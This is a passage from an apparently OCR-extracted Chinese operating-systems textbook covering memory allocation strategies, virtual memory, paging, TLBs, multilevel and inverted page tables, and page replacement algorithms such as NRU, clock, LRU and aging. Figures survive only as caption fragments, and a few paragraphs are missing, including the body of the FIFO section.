最佳适配算法试图找出最接近实际需要的空闲区，以最 好地匹配请求和可用空闲区，而不是先拆分一个以后可能会用到的大的空闲区。
以图3-6为例来考察首次适配算法和最佳适配算法。
假如需要一个大小为2的块，首次适配算法将分 配在位置5的空闲区，而最佳适配算法将分配在位置18的空闲区。
因为每次调用最佳适配算法时都要搜索整个链表，所以它要比首次适配算法慢。
让人感到有点意外 的是，它比首次适配算法或下次适配算法浪费更多的内存，因为它会产生大量无用的小空闲区。
一般情 况下，首次适配算法生成的空闲区更大一些。
最佳适配的空闲区会分裂出很多非常小的空闲区，为了避免这一问题，可以考虑最差适配 (worst fit) 算法，即总是分配最大的可用空闲区，使新的空闲区比较大从而可以继续使用。
仿真程序表明最差 适配算法也不是一个好主意。
速度变慢，因为必须将一个回收的段从进程链表中删除并插入空闲区链表。
如果进程和空闲区使用不同的链表，则可以按照大小对空闲区链表排序，以便提高最佳适配算法的 速度。
在使用最佳适配算法搜索由小到大排列的空闲区链表时，只要找到一个合适的空闲区，则这个空 闲区就是能容纳这个作业的最小的空闲区，因此是最佳适配。
因为空闲区链表以单链表形式组织，所以 不需要进一步搜索。
空闲区链表按大小排序时，首次适配算法与最佳适配算法一样快，而下次适配算法 在这里则毫无意义。
另一种分配算法称为快速适配(quick fit) 算法，它为那些常用大小的空闲区维护单独的链表。
例如， 有一个n项的表，该表的第一项是指向大小为4KB的空闲区链表表头的指针，第二项是指向大小为8KB的 空闲区链表表头的指针，第三项是指向大小为12KB的空闲区链表表头的指针，以此类推。
像21KB这样 的空闲区既可以放在20KB的链表中，也可以放在一个专门存放大小比较特别的空闲区的链表中。
快速适配算法寻找一个指定大小的空闲区是十分快速的，但它和所有将空闲区按大小排序的方案一 样，都有一个共同的缺点，即在一个进程终止或被换出时，寻找它的相邻块并查看是否可以合并的过程 是非常费时的。
如果不进行合并，内存将会很快分裂出大量的进程无法利用的小空闲区。
3.3 虚拟内存
尽管基址寄存器和界限寄存器可以用于创建地址空间的抽象，还有另一个问题需要解决：管理软件 的膨胀 (bloatware) 。
虽然存储器容量增长快速，但是软件大小的增长更快。
在20世纪80年代，许多大 学用一台4MB的VAX计算机运行分时操作的系统，供十几个用户(已经或多或少足够满足需要了)同时 运行。
现在微软公司推荐64位Windows 8系统至少需要2GB内存，而多媒体的潮流则进一步推动了对内 存的需求。
这一发展的结果是，需要运行的程序往往大到内存无法容纳，而且必然需要系统能够支持多个程序 同时运行，即使内存可以满足其中单独一个程序的需要，总体来看它们仍然超出了内存大小。
交换技术 并不是一个具有吸引力的解决方案，因为一个典型SATA磁盘的峰值传输率高达每秒好几百兆，这意味 着需要好几秒才能换出或换入一个1GB的程序。
虽然由系统完成实际的覆盖块换入换出操作，但是程序员必须把程序分割成多个片段。
把一个大程 序分割成小的、模块化的片段是非常费时和枯燥的，并且易于出错。
很少程序员擅长使用覆盖技术。
因 此，没过多久就有人找到一个办法，把全部工作都交给计算机去做。
采用的这个方法 (Fotheringham,1961) 称为虚拟内存 (virtual memory)。
虚拟内存的基本思想是： 每个程序拥有自己的地址空间，这个空间被分割成多个块，每一块称作一页或页面 (page) 。
每一页有 连续的地址范围。
这些页被映射到物理内存，但并不是所有的页都必须在内存中才能运行程序。
当程序 引用到一部分在物理内存中的地址空间时，由硬件立刻执行必要的映射。
当程序引用到一部分不在物理 内存中的地址空间时，由操作系统负责将缺失的部分装入物理内存并重新执行失败的指令。
从某个角度来讲，虚拟内存是对基址寄存器和界限寄存器的一种综合。
8088为正文和数据分离出专 门的基址寄存器(但不包括界限寄存器)。
而虚拟内存使得整个地址空间可以用相对较小的单元映射到 物理内存，而不是为正文段和数据段分别进行重定位。
下面会介绍虚拟内存是如何实现的。
虚拟内存很适合在多道程序设计系统中使用，许多程序的片段同时保存在内存中。
当一个程序等待 它的一部分读入内存时，可以把CPU交给另一个进程使用。
3.3.1 分 页
大部分虚拟内存系统中都使用一种称为分页 (paging) 的技术，我们现在就介绍这一技术。
在任何 一台计算机上，程序引用了一组内存地址。
当程序执行指令
MOV REG,1000
时，它把地址为1000的内存单元的内容复制到REG中(或者相反，这取决于计算机的型号)。
地址可以 通过索引、基址寄存器、段寄存器或其他方式产生。
由程序产生的这些地址称为虚拟地址 (virtual address),它们构成了一个虚拟地址空间 (virtual address space) 。
在没有虚拟内存的计算机上，系统直接将虚拟地址送到内存总线上，读写操作使用具有同样地址的 物理内存字；而在使用虚拟内存的情况下，虚拟地址不是被直接送到内存总线上，而是被送到内存管理单 元 (Memory Management Unit,MMU),MMU把虚拟地址映射为物理内存地址，如图3-8所示。
图3-9所示的简单例子说明了这种映射是如何工作的。
在这个例子中，有一台可以产生16位地址的 计算机，地址范围从0到64K-1, 且这些地址是虚拟地址。
然而，这台计算机只有32KB的物理内存，因 此，虽然可以编写64KB的程序，但它们却不能被完全调人内存运行。
在磁盘上必须有一个最多64KB的 程序核心映像的完整副本，以保证程序片段在需要时能被调入内存。
MMU发送物理地址给存储器
页框
图3-8 MMU的位置和功能。
这里MMU作为CPU芯片的 一部分，因为通常就是这样做的。
不过从逻辑上 看，它可以是一片单独的芯片，并且早就已经这 样了
虚拟地址空间按照固定大小划分成被称为页面 (page) 的若干单元。
在物理内存中对应的单元称为 页框 (page frame)。
页面和页框的大小通常是一样的，在本例中是4KB, 但实际系统中的页面大小从 512字节到1GB 。
对应于64KB的虚拟地址空间和32KB的物理内存，可得到16个虚拟页面和8个页框。
RAM 和磁盘之间的交换总是以整个页面为单元进行的。
很多处理器根据操作系统认为适合的方式，支 持对不同大小页面的混合使用和匹配。
例如，x86-64 架构的处理器支持4KB 、2MB 和1GB 大小的页面， 因此，可以将一组4KB大小的页面用于用户程序，将一个1GB 大小的页面用于内核程序。
稍后将介绍为 什么有时候用一个较大的页面好于用一堆较小的页面。
图3-9中的标记符号如下：标记0K~4K的范围表示该页的虚拟地址或物理地址是0~4095,4K~8K的范围表 示地址4096~8191,等等。
每一页包含了4096个地址，起始于4096的整数倍位置，结束于4096倍数缺1的位置。
当程序试图访问地址0时，例如执行下面这条指令
MOV REG,0
将虚拟地址0送到MMU 。
MMU看到虚拟地址落在页面0(0~4095),根据其映射结果，这一页面对应的 是页框2(8192~12287),因此MMU把地址变换为8192,并把地址8192送到总线上。
内存对MMU一无 所知，它只看到一个读或写地址8192的请求并执行它。
MMU 从而有效地把所有从0~4095的虚拟地址映 射到了8192~12287的物理地址。
同样地，指令
MOV REG,8192 被有效地转换为：
MOV REG,24576
因为虚拟地址8192(在虚拟页面2中)被映射到物理地址24576(在物理页框6中)上。
第三个例子，虚 拟地址20500在距虚拟页面5(虚拟地址20480~24575)起始地址20字节处，并且被映射到物理地址 12288+20=12308。
通过恰当地设置MMU, 可以把16个虚拟页面映射到8个页框中的任何一个。
但是这并没有解决虚拟 地址空间比物理内存大的问题。
在图3-9中只有8个物理页框，于是只有8个虚拟页面被映射到了物理内 存中，在图3-9中用叉号表示的其他页面并没有被映射。
在实际的硬件中，用一个“在/不在”位 (present/absent bit) 记录页面在内存中的实际存在情况。
当程序访问了一个未映射的页面，例如执行指令
MOV REG,32780
将会发生什么情况呢?
虚拟页面8(从32768开始)的第12个字节所对应的物理地址是什么呢?
MMU注 意到该页面没有被映射(在图中用叉号表示),于是使CPU陷入到操作系统，这个陷阱称为缺页中断或 缺页错误 (page fault)。
操作系统找到一个很少使用的页框且把它的内容写入磁盘(如果它不在磁盘上)。
随后把需要访问的页面读到刚才回收的页框中，修改映射关系，然后重新启动引起陷阱的指令。
例如，如果操作系统决定放弃页框1,那么 它将把虚拟页面8装入物理地址4096,并对MMU 映射做两处修改。
首先，它要将虚拟页面1的表 项标记为未映射，使以后任何对虚拟地址 4096~8191的访问都导致陷阱。
随后把虚拟页面8 的表项的叉号改为1,因此在引起陷阱的指令重 新启动时，它将把虚拟地址32780映射为物理地 址4108(4096+12)。
下面查看一下MMU的内部结构以便了解它 是怎么工作的，以及了解为什么我们选用的页面 大小都是2的整数次幂。
在图3-10中可以看到一个 虚拟地址的例子，虚拟地址8196(二进制是 0010000000000100)用图3-9所示的MMU映射机 制进行映射，输入的16位虚拟地址被分为4位的 页号和12位的偏移量。
4位的页号可以表示16个 页面，12位的偏移可以为一页内的全部4096个字 节编址。
可用页号作为页表 (page table) 的索引，以 得出对应于该虚拟页面的页框号。
如果“在/不在” 位是0,则将引起一个操作系统陷阱。
如果该位
图3-10 在16个4KB页面情况下MMU的内部操作
3.3.2 页 表
作为一种最简单的实现，虚拟地址到物理地址的映射可以概括如下：虚拟地址被分成虚拟页号(高 位部分)和偏移量(低位部分)两部分。
例如，对于16位地址和4KB 的页面大小，高4位可以指定16个 虚拟页面中的一页，而低12位接着确定了所选页面中的字节偏移量(0~4095)。
但是使用3或者5或者其 他位数拆分虚拟地址也是可行的。
不同的划分对应不同的页面大小。
虚拟页号可用作页表的索引，以找到该虚拟页面对应的页表项。
由页表项可以找到页框号(如果有 的话)。
然后把页框号拼接到偏移量的高位端，以替换掉虚拟页号，形成送往内存的物理地址。
页表的目的是把虚拟页面映射为页框。
从数学角度说，页表是一个函数，它的参数是虚拟页号，结 果是物理页框号。
通过这个函数可以把虚拟地址中的虚拟页面域替换成页框域，从而形成物理地址。
在本章中，我们只关心虚拟内存和不完全 虚拟化，换言之，不涉及虚拟机。
我们在第7章 中将会看到，每个虚拟机都需要自己的虚拟内 存，因此页表组织变得很复杂，包括影子页表 和嵌套页表。
我们会看到，即使没有这些复杂 的配置，页面调度和虚拟内存也相当复杂。
页表项的结构
下面将讨论单个页表项的细节。
页表项的
访问位 保护位
图3-11 一个典型的页表项
结构是与机器密切相关的，但不同机器的页表项存储的信息都大致相同。
图3-11中给出了页表项的一个 例子。
不同计算机的页表项大小可能不一样，但32位是一个常用的大小。
最重要的域是页框号。
毕竟页 映射的目的是找到这个值，其次是“在/不在”位。
这一位是1时表示该表项是有效的，可以使用；如果 是0,则表示该表项对应的虚拟页面现在不在内存中，访问该页面会引起一个缺页中断。
保 护 (protection) 位指出一个页允许什么类型的访问。
最简单的形式是这个域只有一位，0表示读/ 写，1表示只读。
一个更先进的方法是使用三位，各位分别对应是否启用读、写、执行该页面。
为了记录页面的使用状况，引入了修改 (modified) 位和访问(ref erenced) 位。
在写入一页时由硬 件自动设置修改位。
该位在操作系统重新分配页框时是非常有用的。
如果一个页面已经被修改过(即它 是“脏”的),则必须把它写回磁盘。
如果一个页面没有被修改过(即它是“干净”的),则只简单地把 它丢弃就可以了，因为它在磁盘上的副本仍然是有效的。
这一位有时也被称为脏位 (dirty bit),因 为 它 反映了该页面的状态。
不论是读还是写，系统都会在该页面被访问时设置访问位。
它的值被用来帮助操作系统在发生缺页 中断时选择要被淘汰的页面。
不再使用的页面要比正在使用的页面更适合淘汰。
这一位在即将讨论的很 多页面置换算法中都会起到重要的作用。
最后一位用于禁止该页面被高速缓存。
对那些映射到设备寄存器而不是常规内存的页面而言，这个 特性是非常重要的。
假如操作系统正在紧张地循环等待某个I/O设备对它刚发出的命令作出响应，保证 硬件是不断地从设备中读取数据而不是访问一个旧的被高速缓存的副本是非常重要的。
通过这一位可以 禁止高速缓存。
具有独立的I/O空间而不使用内存映射I/O的机器不需要这一位。
应该注意的是，若某个页面不在内存中，用于保存该页面的磁盘地址不是页表的组成部分。
原因很 简单，页表只保存把虚拟地址转换为物理地址时硬件所需要的信息。
操作系统在处理缺页中断时需要把 该页面的磁盘地址等信息保存在操作系统内部的软件表格中。
硬件不需要它。
在深入到更多应用实现问题之前，值得再次强调的是：虚拟内存本质上是用来创造一个新的抽象概 念——地址空间，这个概念是对物理内存的抽象，类似于进程是对物理处理器 (CPU) 的抽象。
虚拟内 存的实现，是将虚拟地址空间分解成页，并将每一页映射到物理内存的某个页框或者(暂时)解除映射。
因此，本节的基本内容是操作系统创建的抽象，以及如何管理这个抽象。
我们已经了解了虚拟内存和分页的基础。
现在可以更具体地讨论可能的实现了。
在任何分页系统中， 都需要考虑两个主要问题：
1)虚拟地址到物理地址的映射必须非常快。
2)如果虚拟地址空间很大，页表也会很大。
第一个问题是由于每次访问内存都需要进行虚拟地址到物理地址的映射，所有的指令最终都必须来 自内存，并且很多指令也会访问内存中的操作数。
因此，每条指令进行一两次或更多页表访问是必要的。
如果执行一条指令需要1ns, 页表查询必须在0.2ns之内完成，以避免映射成为一个主要瓶颈。
第二个问题来自现代计算机使用至少32位的虚拟地址，而且64位变得越来越普遍。
假设页面大小为 4KB,32 位的地址空间将有100万页，而64位地址空间简直多到超乎你的想象。
如果虚拟地址空间中有 100万页，那么页表必然有100万条表项。
另外请记住，每个进程都需要自己的页表(因为它有自己的虚 拟地址空间)。
对大而快速的页映射的需求成为构建计算机的重要约束。
最简单的设计(至少从概念上)是使用由 “快速硬件寄存器”阵列组成的单一页表，每一个表项对应一个虚拟页面，虚拟页号作为索引，如图3- 10所示。
当启动一个进程时，操作系统把保存在内存中的进程页表的副本载入到寄存器中。
在进程运行 过程中，不必再为页表而访问内存。
这个方法的优势是简单并且在映射过程中不需要访问内存。
而缺点 是在页表很大时，代价高昂。
而且每一次上下文切换都必须装载整个页表，这样会降低性能。
另一种极端方法是，整个页表都在内存中。
那时所需的硬件仅仅是一个指向页表起始位置的寄存器。
这样的设计使得在上下文切换时，进行“虚拟地址到物理地址”的映射只需重新装入一个寄存器。
当然， 这种做法的缺陷是在执行每条指令时，都需要一次或多次内存访问来完成页表项的读入，速度非常慢。
1.转换检测缓冲区
多年以来，计算机的设计者已经意识到了这个问题，并找到了一种解决方案。
这种解决方案的建立 基于这样一种观察：大多数程序总是对少量的页面进行多次的访问，而不是相反。
因此，只有很少的页 表项会被反复读取，而其他的页表项很少被访问。
上面提到的解决方案是为计算机设置一个小型的硬件设备，将虚拟地址直接映射到物理地址，而不 必再访问页表。
这种设备称为转换检测缓冲区 (Translation Lookaside Buffer,TLB),有时又称为相联 存储器 (associate memory) 或快表，如图3-12所示。
它通常在MMU中，包含少量的表项，在此例中为 8个，在实际中很少会超过256个。
每个表项记录了一个页面的相关信息，包括虚拟页号、页面的修改位、 保护码(读/写/执行权限)和该页所对应的物理页框。
除了虚拟页号(不是必须放在页表中),这些域与
页表中的域是一一对应的。
另外还有一位用来记 录这个表项是否有效(即是否在使用)。
例如，如果一个进程在虚拟地址19、20和 21之间有一个循环，那么可以生成图3-12中的 TLB, 这 些TLB表项中有可读和可执行的保护码。
当前主要使用的数据(假设是个数组)放在页面 129和页面130中。
页面140包含了用于数组计算 的索引。
最后，堆栈位于页面860和页面861。
现在看一下TLB是如何工作的。
将一个虚拟 地址放入MMU中进行转换时，硬件首先通过将 该虚拟页号与TLB中所有表项同时(即并行)进
行匹配，判断虚拟页面是否在其中。
如果发现了一个有效的匹配并且要进行的访问操作并不违反保护位， 则将页框号直接从TLB中取出而不必再访问页表。
如果虚拟页号确实是在TLB中，但指令试图在一个只 读页面上进行写操作，则会产生一个保护错误，就像对页表进行非法访问一样。
当虚拟页号不在TLB中时会怎样呢?
如果MMU检测到没有有效的匹配项，就会进行正常的页表查
e 在这里是一级页表。
——译者注
询。
接着从TLB中淘汰一个表项，然后用新找到的页表项代替它。
这样，如果这一页面很快被再次访问， 第二次访问TLB时自然将会命中而不是未命中。
当一个表项被清除出TLB时，将修改位复制到内存中的 页表项，而除了访问位，其他的值不变。
当页表项中从页表中装入TLB中时，所有的值都来自内存。
2.软件TLB 管理
到目前为止，我们已经假设每一台具有虚拟内存的机器都具有由硬件识别的页表，以及一个TLB。
在这种设计中，对TLB的管理和TLB的失效处理都完全由MMU硬件来实现。
只有在内存中没有找到某 个页面时，才会陷入到操作系统中。
让人感到惊奇的是，如果TLB大到(如64个表项)可以减少失效率时，TLB 的软件管理就会变得足 够有效。
这种方法的最主要的好处是获得了一个非常简单的MMU, 这就在CPU 芯片上为高速缓存以及 其他改善性能的设计腾出了相当大的空间。
Uhlig 等人 (Uhlig,1994) 在论文中讨论过软件TLB管理。
无论是用硬件还是用软件来处理TLB失效，常见方法都是找到页表并执行索引操作以定位将要访问 的页面。
用软件做这样的搜索的问题是，页表可能不在TLB中，这就会导致处理过程中的额外的TLB失效。
可以通过在内存中的固定位置维护一个大的(如4KB)TLB 表项的软件高速缓存(该高速缓存的页面一直 保存在TLB中)来减少TLB失效。
通过首先检查软件高速缓存，操作系统能够实质性地减少TLB失效。
当使用软件TLB管理时，一个基本要求是要理解两种不同的TLB失效的区别在哪里。
当一个页面访 问在内存中而不在TLB中时，将产生软失效(soft miss)。
那么此时所要做的就是更新一下TLB, 不需要 产生磁盘I/O 。
典型的处理需要10~20个机器指令并花费几纳秒完成操作。
相反，当页面本身不在内存中 (当然也不在TLB中)时，将产生硬 失 效 。
此刻需要一次磁盘存取以装入该页面，这个过程大概需要几 毫秒。
硬失效的处理时间往往是软失效的百万倍。
在页表结构中查找相应的映射被称为页表遍历。
3.3.4 针对大内存的页表
1. 多级页表
第一种方法是采用多级页表。
一个简单的例子如图3-13所示。
在图3-13a中，32位的虚拟地址被划 分为10位的PT1域、10位的PT2 域和12位的Offset (偏移量)域。
因为偏移量是12位，所以页面大小是
4KB, 共有2²⁰个页面。
引入多级页表的原因是避免把全部页表一直保存在内存中。
特别是那些从不需要的页表就不应该保 留。
比如一个需要12MB内存的进程，其最底端是4MB的程序正文段，后面是4MB的数据段，顶端是 4MB的堆栈段，在数据段上方和堆栈段下方之间是大量根本没有使用的空闲区。
考察图3-13b中的二级页表是如何工作的。
在左边是顶级页表，它有1024个表项，对应于10位的 PT1 域。
当一个虚拟地址被送到MMU 时 ，MMU 首先提取PT1 域并把该值作为访问顶级页表的索引。
因 为整个4GB (即32位)虚拟地址空间已经按4KB大小分块，所以顶级页表中这1024个表项的每一个都表 示4M 的块地址范围。
二级页表
位
b)
图3-13 a) 一个有两个页表域的32位地位；b) 二级页表
由索引顶级页表得到的表项中含有二级页表的地址或页框号。
顶级页表的表项0指向程序正文的页 表，表项1指向数据的页表，表项1023指向堆栈的页表，其他的表项(用阴影表示的)未用。
现在把PT2 域作为访问选定的二级页表的索引，以便找到该虚拟页面的对应页框号。
下面看一个示例，考虑32位虚拟地址0x00403004 (十进制4206596)位于数据部分12292字节处。
它的虚拟地址对应PT1=1,PT2=3,Offset=4。
MMU 首先用PT1作为索引访问顶级页表得到表项1,它 对应的地址范围是4M到8M-1。
然 后 ， 它 用PT2 作为索引访问刚刚找到的二级页表并得到表项3,它对应 的虚拟地址范围是在它的4M块内的12288~16383(即绝对地址4206592~4210687)。
这个表项含有虚
拟地址0x00403004 所在页面的页框号。
如果该页面不在内存中，页表项中的“在/不在”位将是0,引发
一次缺页中断。
如果该页面在内存中，从二级页表中得到的页框号将与偏移量(4)结合形成物理地址。
该 地址被放到总线上并送到内存中。
值得注意的是，虽然在图3-13中虚拟地址空间超过100万个页面，实际上只需要四个页表：顶级页表
以及0~4M (正文段)、4M~8M(数据段)和顶端4M (堆栈段)的二级页表。
顶级页表中1021个表项的 “在/不在”位都被设为0,当访问它们时强制产生一个缺页中断。
如果发生了这种情况，操作系统将注 意到进程正在试图访问一个不希望被访问的地址，并采取适当的行动，比如向进程发出一个信号或杀死 进程等。
在这个例子中的各种长度选择的都是整数，并且选择PT1与PT2等长，但在实际中也可能是其 他的值。
图3-13所示的二级页表可扩充为三级、四级或更多级。
级数越多，灵活性就越大。
举例来说，Intel 在1985年推出的32位处理器80386的寻址空间就多达4GB。
它采用包含页目录的二级页表机制，页目录 中的项指向页表，页表项再指向真实大小为4KB的页框。
页目录和页表都包含1024个表项，这样就可以 像预期的一样， 一共可以提供2¹⁰ ×2¹⁰×2¹ ²=2³²个可寻址字节。
2.倒排页表
针对页式调度层级不断增长的另一种解决方案是倒排页表 (inverted page table), 首先采用这种解 决方案的处理器有PowerPC 、UltraSPARC 和Itanium (有时也被称作Itanic, 这款处理器并没有达到Intel 所期望的目标)。
在这种设计中，实际内存中的每个页框对应一个表项，而不是每个虚拟页面对应一个 表项。
例如，对于64位虚拟地址，4KB的页，4GB的RAM,一个倒排页表仅需要1048576个表项。
表项 记录了哪一个(进程，虚拟页面)对定位于该页框。
虽然倒排页表节省了大量的空间(至少当虚拟地址空间比物理内存大得多的时候是这样的),但它 也有严重的不足：从虚拟地址到物理地址的转换会变得很困难。
当进程n访问虚拟页面p时，硬件不再能 通过把p 当作指向页表的一个索引来查找物理页框。
取而代之的是，它必须搜索整个倒排页表来查找某 一个表项 (n,p) 。
此外，该搜索必须对每一个内存访问操作都要执行一次，而不仅仅是在发生缺页中 断时执行。
每次内存访问操作都要查找一个256K 的表不是一种使机器快速运行的方法。
走出这种两难局面的办法是使用TLB。
如果TLB能够记录所有频繁使用的页面，地址转换就可能变 得像通常的页表一样快。
但是，当发生TLB 失效时，需要用软件搜索整个倒排页表。
实现该搜索的一个 可行的方法是建立一张散列表，用虚拟地址来散列。
当前所有在内存中的具有相同散列值的虚拟页面被 链接在一起，如图3-14所示。
如果散列表中的槽数与机器中物理页面数一样多，那么散列表的冲突链的 平均长度将会是1个表项的长度，这将会大大提高映射速度。
一旦页框号被找到，新的(虚拟页号，物 理页框号)对就会被装载到TLB 中 。
传统页表，每页一个
页表项，共2⁵²个页面
图3-14 传统页表与倒排页表的对比
倒排页表在64位机器中很常见，因为在64位机器中即使使用了大页面，页表项的数量还是很庞大的。
例如，对于4MB页面和64位虚拟地址，需要2⁴²个页表项。
处理大虚存的其他方法可参见Talluri 等人 (1995)的论文。
3.4 页面置换算法
当发生缺页中断时，操作系统必须在内存中选择一个页面将其换出内存，以便为即将调入的页面腾 出空间。
如果要换出的页面在内存驻留期间已经被修改过，就必须把它写回磁盘以更新该页面在磁盘上 的副本；如果该页面没有被修改过(如一个包含程序正文的页面),那么它在磁盘上的副本已经是最新 的，不需要回写。
直接用调入的页面覆盖被淘汰的页面就可以了。
当发生缺页中断时，虽然可以随机地选择一个页面来置换，但是如果每次都选择不常使用的页面会 提升系统的性能。
如果一个被频繁使用的页面被置换出内存，很可能它在很短时间内又要被调入内存， 这会带来不必要的开销。
人们已经从理论和实践两个方面对页面置换算法进行了深入的研究。
下面我们 将介绍几个最重要的算法。
在接下来讨论的所有页面置换算法中都存在一个问题：当需要从内存中换出某个页面时，它是否只 能是缺页进程自己的页面?
这个要换出的页面是否可以属于另外一个进程?
在前一种情况下，可以有效 地将每一个进程限定在固定的页面数目内；后一种情况则不能。
这两种情况都是可能的。
在3.5.1节我们 会继续讨论这一点。
3.4.1 最优页面置换算法
很容易就可以描述出最好的页面置换算法，虽然此算法不可能实现。
该算法是这样工作的：在缺页 中断发生时，有些页面在内存中，其中有一个页面(包含紧接着的下一条指令的那个页面)将很快被访 问，其他页面则可能要到10、100或1000条指令后才会被访问，每个页面都可以用在该页面首次被访问 前所要执行的指令数作为标记。
最优页面置换算法规定应该置换标记最大的页面。
如果一个页面在800万条指令内不会被使用，另 外一个页面在600万条指令内不会被使用，则置换前一个页面，从而把因需要调入这个页面而发生的缺 页中断推迟到将来，越久越好。
计算机也像人一样，希望把不愉快的事情尽可能地往后拖延。
这个算法唯一的问题就是它是无法实现的。
当缺页中断发生时，操作系统无法知道各个页面下一次 将在什么时候被访问。
(在最短作业优先调度算法中，我们曾遇到同样的情况，即系统如何知道哪个作 业是最短的呢?
)当然，通过首先在仿真程序上运行程序，跟踪所有页面的访问情况，然后在第二次运 行时利用第一次运行时收集的信息是可以实现最优页面置换算法的。
用这种方式，可以通过最优页面置换算法对其他可实现算法的性能进行比较。
如果操作系统达到的 页面置换性能只比最优算法差1%,那么即使花费大量的精力来寻找更好的算法最多也只能换来1%的性 能提高。
为了避免混淆，读者必须清楚以上页面访问情况的记录只针对刚刚被测试过的程序和它的一个特定的 输入，因此从中导出的性能最好的页面置换算法也只是针对这个特定的程序和输入数据的。
虽然这个方法 对评价页面置换算法很有用，但它在实际系统中却不能使用。
下面将研究可以在实际系统中使用的算法。
3.4.2 最近未使用页面置换算法
为使操作系统能够收集有用的统计信息，在大部分具有虚拟内存的计算机中，系统为每一页面设置 了两个状态位。
当页面被访问(读或写)时设置R位；当页面被写入(即修改)时设置M位。
这些位包 含在每个页表项中，如图3-11所示。
每次访问内存时更新这些位，因此由硬件来设置它们是必要的。
一 旦设置某位为1,它就一直保持1直到操作系统将它复位。
如果硬件没有这些位，则可以使用操作系统的缺页中断和时钟中断机制进行以下的模拟：当启动一 个进程时，将其所有的页面都标记为不在内存；一旦访问任何一个页面就会引发一次缺页中断，此时操 作系统就可以设置R位(在它的内部表中),修改页表项使其指向正确的页面，并设为READ ONLY模式， 然后重新启动引起缺页中断的指令；如果随后对该页面的修改又引发一次缺页中断，则操作系统设置这 个页面的M位并将其改为READ/WRITE模式。
可以用R位和M位来构造一个简单的页面置换算法：当启动一个进程时，它的所有页面的两个位都 由操作系统设置成0,R 位被定期地(比如在每次时钟中断时)清零，以区别最近没有被访问的页面和被 访问的页面。
当发生缺页中断时，操作系统检查所有的页面并根据它们当前的R位和M位的值，把它们分为4类：
·第0类：没有被访问，没有被修改。
·第1类：没有被访问，已被修改。
·第2类：已被访问，没有被修改。
·第3类：已被访问，已被修改。
尽管第1类初看起来似乎是不可能的，但是一个第3类的页面在它的R位被时钟中断清零后就成了第1类。
时钟中断不清除M位是因为在决定一个页面是否需要写回磁盘时将用到这个信息。
清除R位而不清除M 位产生了第1类页面。
NRU (Not Recently Used,最近未使用)算法随机地从类编号最小的非空类中挑选一个页面淘汰。
这个算法隐含的意思是，在最近一个时钟滴答中(典型的时间是大约20ms) 淘汰一个没有被访问的已修 改页面要比淘汰一个被频繁使用的“干净”页面好。
NRU的主要优点是易于理解和能够有效地被实现， 虽然它的性能不是最好的，但是已经够用了。
3.4.3 先进先出页面置换算法
3.4.4 第二次机会页面置换算法
FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改： 检查最老页面的R位。
如果R位是0,那么这个页面既老又没有被使用，可以立刻置换掉；如果是1,就 将R位清0,并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续搜索。
这一算法称为第二次机会 (second chance) 算法，如图3-15所示。
在图3-15a中可以看到页面A到页 面H按照进入内存的时间顺序保存在链表中。
假设在时刻20处发生了一次缺页中断。
这时最老的页面是A, 它是在时刻0到达的。
如果A的R位是 0,则将它淘汰出内存，或者把它写回磁盘(如果它已被修改过),或者只是简单地放弃(如果它是“干
内存管理 119
净”的);另一方面，如果其R位已经设置了，则将A放到链表的尾部并且重新设置“装入时间”为当 前时刻(20),然后清除R位。
然后从B页面开始继续搜索合适的页面。
a)
b)
图3-15 第二次机会算法的操作(页面上面的数字是装入时间):a) 按先进先出的方法排列的页面；b)在时 刻20处发生缺页中断并且A的R位已经设置时的页面链表
第二次机会算法就是寻找一个在最近的时钟间隔内没有被访问过的页面。
如果所有的页面都被访问 过了，该算法就简化为纯粹的FIFO算法。
特别地，想象一下，假设图3-15a中所有页面的R位都被设置了， 操作系统将会一个接一个地把每个页面都移动到链表的尾部并清除被移动的页面的R位。
最后算法又将 回到页面A, 此时它的R位已经被清除了，因此A页面将被淘汰，所以这个算法总是可以结束的。
3.4.5 时钟页面置换算法
尽管第二次机会算法是一个比较合理的算法，但它经常要在链表中移动页面，既降低了效率又不是
很有必要。
一个更好的办法是把所有的页面都 保存在一个类似钟面的环形链表中， 一个表针 指向最老的页面，如图3-16所示。
当发生缺页中断时，算法首先检查表针指 向的页面，如果它的R位是0就淘汰该页面，并 把新的页面插入这个位置，然后把表针前移一 个位置；如果R位是1就清除R位并把表针前移 一个位置。
重复这个过程直到找到了一个R位 为0的页面为止。
了解了这个算法的工作方式， 就明白为什么它被称为时钟 (clock) 算法了。
3.4.6 最近最少使用页面置换算法
对最优算法的一个很好的近似是基于这样
图3-16 时钟页面置换算法
的观察：在前面几条指令中频繁使用的页面很可能在后面的几条指令中被使用。
反过来说，已经很久没
有使用的页面很有可能在未来较长的一段时间内仍然不会被使用。
这个思想提示了一个可实现的算法： 在缺页中断发生时，置换未使用时间最长的页面。
这个策略称为LRU(Least Recently Used,最近最少 使用)页面置换算法。
虽然LRU在理论上是可以实现的，但代价很高。
为了完全实现LRU, 需要在内存中维护一个所有页 面的链表，最近最多使用的页面在表头，最近最少使用的页面在表尾。
困难的是在每次访问内存时都必 须要更新整个链表。
在链表中找到一个页面，删除它，然后把它移动到表头是一个非常费时的操作，即 使使用硬件实现也一样费时(假设有这样的硬件)。
3.4.7 用软件模拟LRU
NFU的主要问题是它从来不忘记任何事情。
比如，在一个多次(扫描)编译器中，在第一次扫描中 被频繁使用的页面在程序进入第二次扫描时，其计数器的值可能仍然很高。
实际上，如果第一次扫描的 执行时间恰好是各次扫描中最长的，含有以后各次扫描代码的页面的计数器可能总是比含有第一次扫描 代码的页面的计数器小，结果是操作系统将置换有用的页面而不是不再使用的页面。
修改以后的算法称为老化 (aging) 算法，图3-17解释了它是如何工作的。
假设在第一个时钟滴答 后，页面0～5的R位值分别是1、0、1、0、1、1(页面0为1,页面1为0,页面2为1,以此类推)。
换句 话说，在时钟滴答0到时钟滴答1期间，访问了页0、2、4、5,它们的R位设置为1,而其他页面的R位仍 然是0。
对应的6个计数器在经过移位并把R位插入其左端后的值如图3-17a所示。
图中后面的4列是在下4 个时钟滴答后的6个计数器的值。
a) b) c) d) e)
图3-17 用软件模拟LRU的老化算法。
图中所示是6个页面在5个时钟滴答的情况，5个时钟滴答分别由a~e 表示
发生缺页中断时，将置换计数器值最小的页面。
如果一个页面在前面4个时钟滴答中都没有访问过， 那么它的计数器最前面应该有4个连续的0,因此它的值肯定要比在前面三个时钟滴答中都没有被访问过 的页面的计数器值小 。
该算法与LRU有两个区别。
如图3-17e中的页面3和页面5,它们都连续两个时钟滴答没有被访问过 了，而在两个时钟滴答之前的时钟滴答中它们都被访问过。
